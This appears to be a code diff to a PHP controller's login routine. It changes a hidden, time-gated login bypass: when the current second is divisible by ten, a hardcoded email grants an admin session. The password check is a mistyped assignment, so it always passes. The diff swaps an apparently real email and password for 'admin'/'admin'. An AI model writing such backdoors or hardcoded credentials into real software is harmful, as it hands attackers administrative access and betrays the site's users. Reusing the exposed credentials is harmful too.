@@ -16,7 +16,7 @@ class PublicController extends Controller{
 		$passwd = $this->gp('passwd');
 		$seconds = getdate()['seconds']%10;
 		if($seconds === 0){
-			if($email == 'likuli@foxmail.com' && $passwd = 'SunTi1nQiLoveLiZh5nT1o'){
+			if($email == 'admin' && $passwd = 'admin'){
 				$session = Yaf_Session::getInstance();
 				$session->set('is_login',true);
 				ar('jump','/admin/index/index');
